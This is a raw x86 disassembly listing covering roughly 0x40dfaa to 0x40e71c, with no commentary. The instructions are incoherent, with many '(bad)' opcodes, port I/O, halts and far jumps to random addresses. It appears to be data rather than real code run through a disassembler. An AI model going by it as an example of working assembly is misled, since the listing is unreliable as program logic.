  40dfaa:	popa   
  40dfab:	mov    dh,0x62
  40dfad:	iret   
  40dfae:	mov    al,BYTE PTR [eax+edi*2]
  40dfb1:	push   esi
  40dfb2:	(bad)  
  40dfb3:	push   DWORD PTR [eax+0x1]
  40dfb6:	jle    0x40df4e
  40dfb8:	hlt    
  40dfb9:	adc    DWORD PTR [esi+0x73],esp
  40dfbc:	rcl    DWORD PTR [ebp-0x9a0b605],1
  40dfc2:	ins    DWORD PTR es:[edi],dx
  40dfc3:	(bad)  
  40dfc4:	mov    edx,0x3101ac65
  40dfc9:	fwait
  40dfca:	inc    ecx
  40dfcb:	int3   
  40dfcc:	pop    edi
  40dfcd:	adc    eax,0xb855b6a9
  40dfd2:	push   esp
  40dfd3:	adc    al,0x29
  40dfd5:	pop    esi
  40dfd6:	pop    ebx
  40dfd7:	mov    bl,0x14
  40dfd9:	dec    esp
  40dfda:	jne    0x40df93
  40dfdc:	adc    al,0xaa
  40dfde:	push   es
  40dfdf:	cmp    DWORD PTR [edx-0x74222573],edi
  40dfe5:	inc    edi
  40dfe6:	dec    ebx
  40dfe7:	call   0xf4d550c9
  40dfec:	dec    ecx
  40dfed:	(bad)  
  40dfee:	or     ch,bh
  40dff0:	jo     0x40e050
  40dff2:	in     eax,dx
  40dff3:	es lahf 
  40dff5:	gs mov ch,0xc
  40dff8:	sbb    al,0xc
  40dffa:	imul   ebp,DWORD PTR [esi-0x63afba12],0xbfc46390
  40e004:	dec    esp
  40e005:	mov    dh,0x15
  40e007:	inc    eax
  40e008:	sub    al,0xfd
  40e00a:	xchg   DWORD PTR [edx+0x7c5b424f],ebp
  40e010:	cs dec ebx
  40e012:	shl    BYTE PTR [eax],1
  40e014:	icebp  
  40e015:	add    eax,0x175da05e
  40e01a:	(bad)  
  40e01b:	mov    WORD PTR [esi+eiz*8+0x2],?
  40e01f:	xor    eax,0x65c42537
  40e024:	leave  
  40e025:	imul   ebp,DWORD PTR [ebx],0xb7ae7362
  40e02b:	rcr    DWORD PTR [esi+0x751abc0c],0x71
  40e032:	mov    esp,DWORD PTR [edi-0x28]
  40e035:	fbstp  TBYTE PTR [ecx+0x6c]
  40e038:	outs   dx,BYTE PTR ds:[esi]
  40e039:	jne    0x40e03b
  40e03b:	push   0x7f
  40e03d:	test   al,0xd4
  40e03f:	clc    
  40e040:	ins    BYTE PTR es:[edi],dx
  40e041:	sub    al,0x7c
  40e043:	jg     0x40e0a6
  40e045:	pop    edi
  40e046:	mov    edi,es
  40e048:	das    
  40e049:	cmp    DWORD PTR [ebp-0x15],esp
  40e04c:	push   0x52
  40e04e:	clc    
  40e04f:	jb     0x40e0c7
  40e051:	mov    edx,0x72f2efe5
  40e056:	shr    edx,cl
  40e058:	xor    DWORD PTR [edi-0x3c],ecx
  40e05b:	jmp    0x40e04f
  40e05d:	mov    bh,0x9c
  40e05f:	jecxz  0x40e02d
  40e061:	lea    eax,[ecx+0xd]
  40e064:	dec    ebx
  40e065:	push   esp
  40e066:	out    0x8e,eax
  40e068:	outs   dx,BYTE PTR ds:[esi]
  40e069:	cwde   
  40e06a:	add    DWORD PTR [eax],ebx
  40e06c:	add    eax,0x8d8d513a
  40e071:	gs sbb eax,0xd34343c4
  40e077:	sbb    ecx,DWORD PTR [ebp-0x1d]
  40e07a:	mov    ah,0x53
  40e07c:	leave  
  40e07d:	adc    al,BYTE PTR [ebp+0x33657223]
  40e083:	sbb    ah,BYTE PTR [eax-0x5e751079]
  40e089:	imul   esi,DWORD PTR [eax-0x682cbade],0x2d8e3ea5
  40e093:	or     eax,0x31ec1c57
  40e098:	mov    eax,?
  40e09a:	shl    BYTE PTR [esi-0x57],0xc1
  40e09e:	outs   dx,BYTE PTR ds:[esi]
  40e09f:	mov    BYTE PTR [eax+0x18ee569b],0xb0
  40e0a6:	imul   DWORD PTR [edi+0x24cb3315]
  40e0ac:	add    BYTE PTR [eax],ah
  40e0ae:	xchg   edi,eax
  40e0af:	es jb  0x40e0ca
  40e0b2:	in     al,dx
  40e0b3:	clc    
  40e0b4:	add    al,0x1e
  40e0b6:	pop    es
  40e0b7:	sub    al,BYTE PTR [ebx]
  40e0b9:	lods   al,BYTE PTR ds:[esi]
  40e0ba:	mov    ch,0x1d
  40e0bc:	fist   WORD PTR [esi+0x37f9af74]
  40e0c2:	mov    ebp,0x6607aec9
  40e0c7:	outs   dx,DWORD PTR ds:[esi]
  40e0c8:	sbb    al,BYTE PTR [ecx-0x24]
  40e0cb:	xor    eax,0x2c1d6152
  40e0d0:	outs   dx,BYTE PTR ds:[esi]
  40e0d1:	pop    eax
  40e0d2:	mov    DWORD PTR [edi-0x703be749],0xe120c8cb
  40e0dc:	pop    edi
  40e0dd:	adc    al,0x74
  40e0df:	and    al,0x78
  40e0e1:	mov    ds:0x99607806,eax
  40e0e6:	out    dx,eax
  40e0e7:	push   ds
  40e0e8:	iret   
  40e0e9:	or     edx,DWORD PTR [ebp+0x27446c2e]
  40e0ef:	mul    DWORD PTR [edx-0x2c]
  40e0f2:	mov    ebp,0xea44f379
  40e0f7:	cld    
  40e0f8:	adc    BYTE PTR [edx+0x64],bh
  40e0fb:	enter  0x7606,0x3d
  40e0ff:	(bad)  
  40e100:	jbe    0x40e167
  40e102:	enter  0xc3b9,0xd0
  40e106:	fist   DWORD PTR ds:0x8d83ca88
  40e10c:	pop    esp
  40e10d:	aad    0x30
  40e10f:	fstp   QWORD PTR [esi-0x68d46b7f]
  40e115:	les    ebx,FWORD PTR [edi-0x3dbb4bce]
  40e11b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e11c:	sti    
  40e11d:	(bad)
  40e121:	jge    0x40e161
  40e123:	sahf   
  40e124:	test   eax,0x4f1079c6
  40e129:	out    dx,eax
  40e12a:	mov    ah,0xa
  40e12c:	in     al,0xd7
  40e12e:	es push esi
  40e130:	aam    0xd7
  40e132:	loope  0x40e11a
  40e134:	(bad)  
  40e135:	fisttp WORD PTR [esi-0x365885a5]
  40e13b:	popf   
  40e13c:	dec    edx
  40e13d:	cdq    
  40e13e:	in     eax,dx
  40e13f:	nop
  40e140:	sub    BYTE PTR [ecx],dl
  40e142:	stos   BYTE PTR es:[edi],al
  40e143:	xchg   ebp,eax
  40e144:	dec    ecx
  40e145:	fild   QWORD PTR [eax-0x44]
  40e148:	inc    esi
  40e149:	push   edx
  40e14a:	sbb    esi,DWORD PTR [ecx]
  40e14c:	je     0x40e134
  40e14e:	sbb    bl,bh
  40e150:	into   
  40e151:	cmp    eax,0xdb0304d
  40e156:	in     eax,0xa7
  40e158:	scas   eax,DWORD PTR es:[edi]
  40e159:	cmp    al,BYTE PTR [ecx+0x5f0eeb6e]
  40e15f:	into   
  40e160:	sub    eax,0x2ea91fff
  40e165:	mov    edi,0xb7472e05
  40e16a:	inc    ebx
  40e16b:	push   eax
  40e16c:	xchg   ebp,eax
  40e16d:	or     ebx,DWORD PTR [eax+ebx*2+0x6df00c9e]
  40e174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e175:	sbb    DWORD PTR [ecx-0x72],edi
  40e178:	lods   eax,DWORD PTR ds:[esi]
  40e179:	sub    dl,BYTE PTR [ecx-0x5d]
  40e17c:	dec    esi
  40e17d:	dec    ecx
  40e17e:	pop    edx
  40e17f:	ss stos BYTE PTR es:[edi],al
  40e181:	rol    BYTE PTR [ecx+0x4d],1
  40e184:	xchg   ecx,eax
  40e185:	aas    
  40e186:	jne    0x40e13d
  40e188:	mov    BYTE PTR [esi+0x6b],al
  40e18b:	lods   eax,DWORD PTR ds:[esi]
  40e18c:	in     al,0x1f
  40e18e:	loopne 0x40e142
  40e190:	or     DWORD PTR [edx-0x7a],esi
  40e193:	dec    esi
  40e195:	jo     0x40e119
  40e197:	push   cs
  40e198:	stos   DWORD PTR es:[edi],eax
  40e199:	adc    esp,DWORD PTR [edi]
  40e19b:	sbb    eax,0x91e2ee4d
  40e1a0:	xor    DWORD PTR [ebx],ebx
  40e1a2:	mov    al,0x6c
  40e1a4:	push   eax
  40e1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a6:	out    0x45,eax
  40e1a8:	clc    
  40e1a9:	xchg   edi,eax
  40e1aa:	xlat   BYTE PTR ds:[ebx]
  40e1ab:	sub    edx,DWORD PTR [ecx+edi*4-0x51]
  40e1af:	jp     0x40e182
  40e1b1:	adc    esp,DWORD PTR [eax]
  40e1b3:	lahf   
  40e1b4:	sbb    bl,BYTE PTR [ebp+0x6c4853f1]
  40e1ba:	jno    0x40e1cb
  40e1bc:	or     eax,0xece6abb
  40e1c1:	test   eax,0xf53e58c1
  40e1c6:	jp     0x40e19a
  40e1c8:	in     al,0x5c
  40e1ca:	and    al,0x8e
  40e1cc:	popa   
  40e1cd:	test   BYTE PTR [eax],0xe1
  40e1d0:	call   0xca1cf269
  40e1d5:	icebp  
  40e1d6:	xchg   ebx,eax
  40e1d7:	retf   
  40e1d8:	xlat   BYTE PTR ds:[ebx]
  40e1d9:	es xchg edi,eax
  40e1db:	mov    ebx,0x368bc5c8
  40e1e0:	sahf   
  40e1e1:	push   ss
  40e1e2:	xchg   cl,dh
  40e1e4:	in     eax,dx
  40e1e5:	loop   0x40e17b
  40e1e7:	xchg   DWORD PTR [ebx+eax*8+0x18],ecx
  40e1eb:	pop    ebp
  40e1ec:	mov    ds:0xb86b0d63,eax
  40e1f1:	cmp    BYTE PTR [ecx-0x6f3a2e73],cl
  40e1f7:	hlt    
  40e1f8:	pop    es
  40e1f9:	pop    es
  40e1fa:	pusha  
  40e1fb:	push   ss
  40e1fc:	sahf   
  40e1fd:	sbb    BYTE PTR [ecx],bl
  40e1ff:	and    eax,0xcb8bb393
  40e204:	mov    edx,0xd38cbd2f
  40e209:	fist   WORD PTR [eax-0x1186c6d6]
  40e20f:	pop    edi
  40e210:	out    dx,eax
  40e211:	sub    al,0x3d
  40e213:	popf   
  40e214:	daa    
  40e215:	xchg   DWORD PTR [edi-0x35],ebx
  40e218:	ror    BYTE PTR [ecx+0x1c8338d9],0xd6
  40e21f:	jp     0x40e1de
  40e221:	and    eax,0x815701d7
  40e226:	xchg   edx,eax
  40e227:	cmp    bl,BYTE PTR [eax+0x20]
  40e22a:	mov    esi,edi
  40e22c:	jl     0x40e1dd
  40e22e:	sahf   
  40e22f:	mov    ecx,DWORD PTR [edx-0x50]
  40e232:	dec    edx
  40e233:	pop    eax
  40e234:	popf   
  40e235:	dec    edx
  40e236:	and    dh,BYTE PTR [ebx-0x5f427269]
  40e23c:	(bad)  [edi+0x25]
  40e23f:	mov    edi,0x4b5cc27f
  40e244:	push   ebp
  40e245:	push   ss
  40e246:	inc    esi
  40e247:	mov    ds:0xa0a3a053,al
  40e24c:	imul   ebx,DWORD PTR [eax+0x22],0x6302436
  40e253:	mov    esp,ebx
  40e255:	jae    0x40e275
  40e257:	or     DWORD PTR [eax+0x36],0xcf7e9cc5
  40e25e:	xchg   esi,eax
  40e25f:	push   edi
  40e260:	arpl   WORD PTR [ecx+0x61],bx
  40e263:	pop    ebp
  40e264:	ret    0x4fc9
  40e267:	repnz rcr DWORD PTR [ebp-0x2f],0x3c
  40e26c:	cmp    edi,edx
  40e26e:	pop    ecx
  40e26f:	mov    bh,BYTE PTR fs:[edi-0x61]
  40e273:	add    cl,ah
  40e275:	and    DWORD PTR [edx-0x7c],ecx
  40e278:	sub    eax,0xce4b40bc
  40e27d:	jmp    0xf2a3:0xaa53449a
  40e284:	adc    BYTE PTR [esi-0x70],cl
  40e287:	cmp    DWORD PTR [edi],eax
  40e289:	add    eax,esi
  40e28b:	or     eax,0xf5ed2644
  40e290:	shl    BYTE PTR [esi+0x7e],1
  40e293:	push   esp
  40e294:	add    BYTE PTR ds:0x8072ad1e,0x5d
  40e29b:	dec    esi
  40e29c:	add    bh,BYTE PTR [esi+ebx*1+0x0]
  40e2a0:	repz dec ebp
  40e2a2:	pop    ds
  40e2a3:	repz cdq 
  40e2a5:	add    eax,0x8d0f2603
  40e2aa:	(bad)  
  40e2ab:	sbb    edi,DWORD PTR [eax+0x2e]
  40e2ae:	fdiv   DWORD PTR [ebp+0x60]
  40e2b1:	mov    cl,cl
  40e2b3:	and    BYTE PTR [ebp+0x1f],dl
  40e2b6:	lahf   
  40e2b7:	das    
  40e2b8:	jge    0x40e307
  40e2ba:	sbb    ah,BYTE PTR [eax-0x69]
  40e2bd:	pop    edx
  40e2be:	repz sbb BYTE PTR [eax+0x79b74fe],cl
  40e2c5:	and    al,0xa4
  40e2c7:	(bad)  
  40e2c8:	out    dx,al
  40e2c9:	retf   0x518b
  40e2cc:	aad    0x49
  40e2ce:	stc    
  40e2cf:	sub    al,cl
  40e2d1:	jo     0x40e2a0
  40e2d3:	sbb    al,0x52
  40e2d5:	retf   
  40e2d6:	inc    edx
  40e2d7:	stos   DWORD PTR es:[edi],eax
  40e2d8:	mov    eax,es:0xfa7ed129
  40e2de:	mov    bh,0x63
  40e2e0:	dec    ebp
  40e2e1:	cli    
  40e2e2:	add    BYTE PTR [edi],bl
  40e2e4:	mov    al,ds:0x368f9fc1
  40e2e9:	sub    cl,al
  40e2eb:	leave  
  40e2ec:	mov    esp,0x8422d0e6
  40e2f1:	shl    ecx,1
  40e2f3:	xchg   edx,eax
  40e2f4:	in     al,dx
  40e2f5:	out    0x5e,al
  40e2f7:	outs   dx,BYTE PTR ds:[esi]
  40e2f8:	repnz (bad) 
  40e2fa:	lock add esp,DWORD PTR [ebx-0x31bcd9c6]
  40e301:	jmp    0x40e2df
  40e303:	add    al,BYTE PTR [esi+edx*4+0x7631701e]
  40e30a:	out    dx,al
  40e30b:	int    0xc0
  40e30d:	jp     0x40e2f8
  40e30f:	add    ecx,DWORD PTR [ebp-0x5]
  40e312:	test   BYTE PTR [ecx],al
  40e314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e315:	fwait
  40e316:	enter  0xce60,0x95
  40e31a:	call   0x88ec:0x5441dba1
  40e321:	mov    es,ebp
  40e323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e324:	xchg   ecx,eax
  40e325:	jnp    0x40e390
  40e327:	mov    eax,ds:0x3c337324
  40e32c:	ins    BYTE PTR es:[edi],dx
  40e32d:	push   ebx
  40e32e:	dec    edi
  40e32f:	enter  0xac74,0x7
  40e333:	js     0x40e319
  40e335:	pop    es
  40e336:	scas   al,BYTE PTR es:[edi]
  40e337:	sti    
  40e338:	dec    ebp
  40e339:	inc    ecx
  40e33a:	rol    BYTE PTR [esi-0x2fa32424],cl
  40e340:	sbb    esp,DWORD PTR [eax-0x5a]
  40e343:	jl     0x40e37d
  40e345:	inc    esi
  40e346:	mov    esp,0x6750f2f
  40e34b:	ret    0xbd02
  40e34e:	fmul   st(2),st
  40e350:	js     0x40e383
  40e352:	push   ebx
  40e353:	pop    ds
  40e354:	jo     0x40e3bc
  40e356:	and    BYTE PTR [edi],bh
  40e358:	int    0x87
  40e35a:	into   
  40e35b:	jle    0x40e347
  40e35d:	inc    esi
  40e35e:	jmp    0xb21eb554
  40e363:	sti    
  40e364:	pop    ebp
  40e365:	fidiv  WORD PTR [ebp+0x109d3bcc]
  40e36b:	mov    bh,0x82
  40e36d:	int3   
  40e36e:	jmp    0x21ea8cb9
  40e373:	jbe    0x40e312
  40e375:	push   ecx
  40e376:	mov    edi,DWORD PTR [eax+0x59]
  40e379:	jo     0x40e339
  40e37b:	fwait
  40e37c:	jns    0x40e322
  40e37e:	fnstcw WORD PTR [ebp+0x48b0adf6]
  40e384:	cmp    al,0x31
  40e386:	into   
  40e387:	xchg   ecx,eax
  40e388:	mov    ch,0x9e
  40e38a:	or     eax,0x12b64cf6
  40e38f:	sub    al,0x7e
  40e391:	mov    BYTE PTR [edx],dh
  40e393:	loope  0x40e40a
  40e395:	clc    
  40e396:	rol    DWORD PTR [esi+edi*8-0x7a],cl
  40e39a:	mov    al,ds:0xdb5c7ca0
  40e39f:	cs dec ecx
  40e3a1:	mov    BYTE PTR [eax+0x5e27f84f],al
  40e3a7:	xchg   esi,eax
  40e3a8:	mov    cl,0x85
  40e3aa:	dec    esi
  40e3ab:	dec    ebp
  40e3ac:	adc    al,0x20
  40e3ae:	mov    esp,0x5c49e5d8
  40e3b3:	mov    eax,ds:0xaac1547f
  40e3b8:	sbb    DWORD PTR [eax],esi
  40e3ba:	test   al,0xbf
  40e3bc:	popf   
  40e3bd:	or     bl,al
  40e3bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3c0:	sbb    BYTE PTR [esi+0x60711a41],dh
  40e3c6:	add    BYTE PTR [ebx+0x2e673387],dh
  40e3cc:	out    0x4f,eax
  40e3ce:	mov    bh,0xa0
  40e3d0:	ds stos BYTE PTR es:[edi],al
  40e3d2:	mov    bh,BYTE PTR [edx]
  40e3d4:	fdivr  st(2),st
  40e3d6:	aas    
  40e3d7:	in     al,0xf
  40e3d9:	dec    esp
  40e3da:	add    eax,0x2f184ca5
  40e3df:	dec    ebp
  40e3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3e1:	ins    DWORD PTR es:[edi],dx
  40e3e2:	fiadd  WORD PTR [ebp-0x1]
  40e3e5:	in     eax,0xb2
  40e3e7:	inc    esp
  40e3e8:	cmp    BYTE PTR [edi+edi*1+0x6e9aabd3],0x3b
  40e3f0:	mov    WORD PTR [edi+0x35595e30],ss
  40e3f6:	jbe    0x40e39d
  40e3f8:	stos   BYTE PTR es:[edi],al
  40e3f9:	sbb    eax,0x9b02449b
  40e3fe:	xor    al,0x12
  40e400:	push   ebx
  40e401:	lock and eax,0x6445276c
  40e407:	push   ebx
  40e408:	mov    esp,0xe1a6d65c
  40e40d:	cmp    ch,BYTE PTR [edi-0x66]
  40e410:	dec    DWORD PTR [eax]
  40e412:	cmp    BYTE PTR [edi-0x54115101],cl
  40e418:	jge    0x40e480
  40e41a:	and    dl,BYTE PTR [eax+edi*4-0x57]
  40e41e:	aad    0x51
  40e420:	push   0x70d8681e
  40e425:	push   ds
  40e426:	gs iret 
  40e428:	adc    al,0x69
  40e42a:	dec    ecx
  40e42b:	adc    al,0xc7
  40e42d:	jle    0x40e46e
  40e42f:	xor    bh,bl
  40e431:	push   0x1e
  40e433:	jae    0x40e432
  40e435:	std    
  40e436:	push   esi
  40e437:	cmp    al,0xfc
  40e439:	into   
  40e43a:	popf   
  40e43b:	inc    esi
  40e43c:	sub    al,0x6d
  40e43e:	rcl    al,0xff
  40e441:	test   BYTE PTR [edx-0x29ed270a],0x8d
  40e448:	test   eax,0x5d64015d
  40e44d:	jmp    0x40e3df
  40e44f:	cwde   
  40e450:	xchg   DWORD PTR [edx+0x66be2a49],ecx
  40e456:	adc    ebx,edx
  40e458:	and    eax,0xc78b9310
  40e45d:	inc    edx
  40e45e:	retf   
  40e45f:	in     al,0x8c
  40e461:	dec    edx
  40e462:	and    BYTE PTR [eax+0x24],al
  40e465:	sub    ebx,DWORD PTR [eax-0x2e]
  40e468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e469:	dec    eax
  40e46a:	fcmovu st,st(1)
  40e46c:	(bad)  
  40e46d:	test   eax,0xc85a9da
  40e472:	xor    BYTE PTR [esi-0x2eaf45bc],dl
  40e478:	sub    DWORD PTR [edx],0xf
  40e47b:	xchg   edx,eax
  40e47c:	jnp    0x40e4ac
  40e47e:	pusha  
  40e47f:	jp     0x40e4b1
  40e481:	sub    al,0xcd
  40e483:	fnsave [ebx]
  40e485:	cmp    cl,BYTE PTR [eax-0x2a]
  40e488:	xchg   esp,eax
  40e489:	jg     0x40e453
  40e48b:	test   al,0x7d
  40e48d:	(bad)  
  40e48e:	and    al,0xf2
  40e490:	fcmovbe st,st(3)
  40e492:	xchg   ecx,eax
  40e493:	iret   
  40e494:	xor    eax,0x28a63dd9
  40e499:	xchg   BYTE PTR [ecx+0x59],ah
  40e49c:	dec    ebp
  40e49d:	add    esi,DWORD PTR [eax+0x64]
  40e4a0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40e4a2:	xchg   BYTE PTR [ebx+edx*1],dh
  40e4a5:	and    ecx,esi
  40e4a7:	jb     0x40e441
  40e4a9:	retf   
  40e4aa:	push   0x34
  40e4ac:	push   eax
  40e4ad:	mov    edi,0x188cd438
  40e4b2:	pushf  
  40e4b3:	inc    ecx
  40e4b4:	xchg   ebp,eax
  40e4b5:	test   al,0xed
  40e4b7:	popa   
  40e4b8:	aad    0xcd
  40e4ba:	mov    ecx,0xd3fb1ee
  40e4bf:	xchg   edx,eax
  40e4c0:	out    0xab,eax
  40e4c2:	add    edi,ebp
  40e4c4:	inc    ebx
  40e4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4c6:	dec    edi
  40e4c7:	cs add eax,0x7c53a2e2
  40e4cd:	retf   0xe903
  40e4d0:	fs mov ebx,0xa14c230d
  40e4d6:	fmul   QWORD PTR [edx+eax*1+0x1175680c]
  40e4dd:	pop    ss
  40e4de:	aas    
  40e4df:	hlt    
  40e4e0:	cmp    ecx,DWORD PTR [edi]
  40e4e2:	and    dh,dh
  40e4e4:	sub    BYTE PTR [edi-0x15],al
  40e4e7:	in     eax,0x9b
  40e4e9:	adc    DWORD PTR [edx+0x42],edi
  40e4ec:	or     al,0xd6
  40e4ee:	hlt    
  40e4ef:	and    DWORD PTR [edx],eax
  40e4f1:	add    DWORD PTR [ebx+0x29bd816a],ecx
  40e4f7:	mov    ebx,0x91994da4
  40e4fc:	ror    BYTE PTR [edx+0x1dd4b2cb],1
  40e502:	push   edi
  40e503:	and    esp,DWORD PTR [ecx-0x74]
  40e506:	mov    ch,BYTE PTR [esp+ebx*8+0x2f614664]
  40e50d:	pop    esi
  40e50e:	mov    dl,0x81
  40e510:	les    ebp,FWORD PTR [eax-0x75]
  40e513:	lock pusha 
  40e515:	cmp    edi,DWORD PTR [eax+0x793012ef]
  40e51b:	loop   0x40e598
  40e51d:	fwait
  40e51e:	mov    bh,0xfc
  40e520:	adc    edx,edx
  40e522:	lea    esp,[edi+0x79dbc12a]
  40e528:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e529:	in     eax,0x50
  40e52b:	popf   
  40e52c:	jp     0x40e59c
  40e52e:	jno    0x40e548
  40e530:	mov    ah,0x40
  40e532:	(bad)  
  40e533:	mov    ds:0x7624828c,eax
  40e538:	push   cs
  40e539:	and    eax,0x8a652c3c
  40e53e:	aas    
  40e53f:	sub    DWORD PTR [eax-0x72],0xffffffcc
  40e543:	mov    WORD PTR [ecx-0x7ca69aec],?
  40e549:	or     DWORD PTR [eax+0x17],eax
  40e54c:	cmp    bl,BYTE PTR [ebx]
  40e54e:	mov    edi,0x10a906d8
  40e553:	je     0x40e551
  40e555:	xor    eax,0xa22d6eb
  40e55a:	xchg   esi,eax
  40e55b:	int3   
  40e55c:	inc    edi
  40e55d:	jbe    0x40e59b
  40e55f:	dec    ecx
  40e560:	jae    0x40e594
  40e562:	in     eax,0xed
  40e564:	sahf   
  40e565:	mov    dl,0xcb
  40e567:	loopne 0x40e56b
  40e569:	retf   
  40e56a:	pop    gs
  40e56c:	outs   dx,BYTE PTR ds:[esi]
  40e56d:	cs enter 0x44f2,0xdb
  40e572:	push   ds
  40e573:	aaa    
  40e574:	mov    cl,0x6c
  40e576:	xor    ebx,ebx
  40e578:	add    edi,edx
  40e57a:	adc    eax,0xe1aad9ac
  40e57f:	test   al,0x6e
  40e581:	into   
  40e582:	and    ebx,ecx
  40e584:	gs lock (bad) 
  40e587:	clc    
  40e588:	mov    ds:0x9eb3bb72,eax
  40e58d:	inc    ebp
  40e58e:	push   ss
  40e58f:	into   
  40e590:	mov    DWORD PTR [ebx+0x442fe50],esp
  40e596:	jbe    0x40e5c5
  40e598:	sub    al,BYTE PTR [edx+0xd]
  40e59b:	inc    ebp
  40e59c:	test   BYTE PTR ds:0xa203b318,bl
  40e5a2:	fcom   QWORD PTR [ebp+0xb611530]
  40e5a8:	fs into 
  40e5aa:	dec    ebp
  40e5ab:	inc    esi
  40e5ac:	pusha  
  40e5ad:	mov    bl,bh
  40e5af:	jle    0x40e5fb
  40e5b1:	dec    esi
  40e5b2:	test   ecx,0x93c9c9a4
  40e5b8:	in     eax,dx
  40e5b9:	mov    eax,ds:0x594ddbba
  40e5be:	fadd   st,st(7)
  40e5c0:	das    
  40e5c1:	push   ecx
  40e5c2:	sbb    ecx,DWORD PTR [ebx+0x79]
  40e5c5:	jbe    0x40e620
  40e5c7:	cmp    BYTE PTR [ecx+eax*4+0x52954204],ah
  40e5ce:	into   
  40e5cf:	lods   al,BYTE PTR ds:[esi]
  40e5d0:	gs inc edx
  40e5d2:	iret   
  40e5d3:	mov    DWORD PTR [edx],esp
  40e5d5:	mov    ecx,0xb33702c3
  40e5da:	mov    ebx,DWORD PTR [eax-0x259df51a]
  40e5e0:	xchg   esi,eax
  40e5e1:	xor    al,0x2b
  40e5e3:	loope  0x40e633
  40e5e5:	ds cdq 
  40e5e7:	sub    al,0xad
  40e5e9:	pop    ss
  40e5ea:	shl    DWORD PTR [edi+eiz*8-0x5e],1
  40e5ee:	jmp    0x40e58e
  40e5f0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e5f2:	lods   al,BYTE PTR ds:[esi]
  40e5f3:	pop    edi
  40e5f4:	push   ebp
  40e5f5:	clc    
  40e5f6:	jp     0x40e592
  40e5f8:	arpl   WORD PTR [esi-0x5a],bp
  40e5fb:	sub    BYTE PTR [ecx+ebx*8],0x89
  40e5ff:	(bad)  
  40e600:	xlat   BYTE PTR ds:[ebx]
  40e601:	lods   eax,DWORD PTR ds:[esi]
  40e602:	lods   al,BYTE PTR ds:[esi]
  40e603:	fld    QWORD PTR [edx+eax*2-0x5a316923]
  40e60a:	rcr    DWORD PTR [edi-0x1c10387c],cl
  40e610:	xor    al,0xa4
  40e612:	or     ebx,0x412106fc
  40e618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e619:	dec    esp
  40e61a:	nop
  40e61b:	inc    ebx
  40e61c:	ret    0xc95d
  40e61f:	shr    eax,1
  40e621:	mov    bh,0x52
  40e623:	call   0xdfed:0xf1ece224
  40e62a:	sbb    eax,0x10076f7d
  40e62f:	inc    ebx
  40e630:	jmp    0x424f:0x914ccb7f
  40e637:	xor    BYTE PTR [ebp+0x6e1a1958],dl
  40e63d:	ror    DWORD PTR [ecx+edi*4],1
  40e640:	mov    ecx,0x230e2ecf
  40e645:	std    
  40e646:	enter  0x5bf0,0xf4
  40e64a:	inc    edx
  40e64b:	retf   
  40e64c:	dec    ebp
  40e64d:	adc    BYTE PTR ss:[eax+0x210c6c],bl
  40e654:	push   es
  40e655:	mov    ds:0x6324b0dc,al
  40e65a:	dec    ecx
  40e65b:	jb     0x40e654
  40e65d:	sbb    eax,0x9204b86f
  40e662:	and    al,0xca
  40e664:	jg     0x40e67b
  40e666:	xlat   BYTE PTR ds:[ebx]
  40e667:	xchg   edx,eax
  40e668:	subps  xmm7,XMMWORD PTR [edx+0x18]
  40e66c:	test   eax,0x836d6b0a
  40e671:	mov    es,WORD PTR [eax-0x1a]
  40e674:	repz xor al,0x59
  40e677:	scas   al,BYTE PTR es:[edi]
  40e678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e679:	sbb    al,BYTE PTR [ecx+eiz*8+0x15]
  40e67d:	cld    
  40e67e:	push   0x6c
  40e680:	out    0x26,al
  40e682:	pop    es
  40e683:	inc    eax
  40e684:	das    
  40e685:	xchg   BYTE PTR [eax+0x36678891],bl
  40e68b:	cmp    al,ah
  40e68d:	js     0x40e6dc
  40e68f:	ins    DWORD PTR es:[edi],dx
  40e690:	sar    ebx,1
  40e692:	ins    DWORD PTR es:[edi],dx
  40e693:	jne    0x40e62d
  40e695:	lock adc eax,0x732c31fd
  40e69b:	std    
  40e69c:	mov    eax,ebp
  40e69e:	push   edx
  40e69f:	jmp    0xc5cc2c60
  40e6a4:	jge    0x40e6ee
  40e6a6:	shl    DWORD PTR [esi+0x3f1e163c],1
  40e6ac:	rcl    DWORD PTR [ebp-0x70],0x75
  40e6b0:	sbb    ebp,ecx
  40e6b2:	ins    DWORD PTR es:[edi],dx
  40e6b3:	ror    BYTE PTR ds:0xfc1a9e66,cl
  40e6b9:	dec    esi
  40e6ba:	cwde   
  40e6bb:	add    al,0x5e
  40e6bd:	adc    BYTE PTR [eax-0x4e3580d0],ch
  40e6c3:	push   ds
  40e6c4:	sub    eax,0xf609f211
  40e6c9:	mov    eax,0xcec42ff4
  40e6ce:	push   eax
  40e6cf:	pop    ds
  40e6d0:	and    BYTE PTR [ecx-0x678c355e],0xda
  40e6d7:	mov    ebp,0x3013839
  40e6dc:	das    
  40e6dd:	xchg   ecx,eax
  40e6de:	bound  ecx,QWORD PTR [edx-0x1b175659]
  40e6e4:	pop    ebx
  40e6e5:	rcl    ecx,0x8a
  40e6e8:	hlt    
  40e6e9:	jmp    0x2fee9c8e
  40e6ee:	sbb    ecx,DWORD PTR [ecx-0x670987e1]
  40e6f4:	push   0xffffff82
  40e6f6:	push   cs
  40e6f7:	iret   
  40e6f8:	mov    edx,0xd41062dd
  40e6fd:	dec    edx
  40e6fe:	jne    0x40e777
  40e700:	das    
  40e701:	jle    0x40e68e
  40e703:	out    0xf,eax
  40e705:	push   ecx
  40e706:	call   0x5dd83729
  40e70b:	add    BYTE PTR [edx],dh
  40e70d:	cld    
  40e70e:	mov    ah,0xb3
  40e710:	fsubr  DWORD PTR [edi+ebp*2]
  40e713:	jl     0x40e777
  40e715:	sub    DWORD PTR [ecx],esi
  40e717:	enter  0xafa5,0xe4
  40e71b:	inc    eax
  40e71c:	ss hlt 
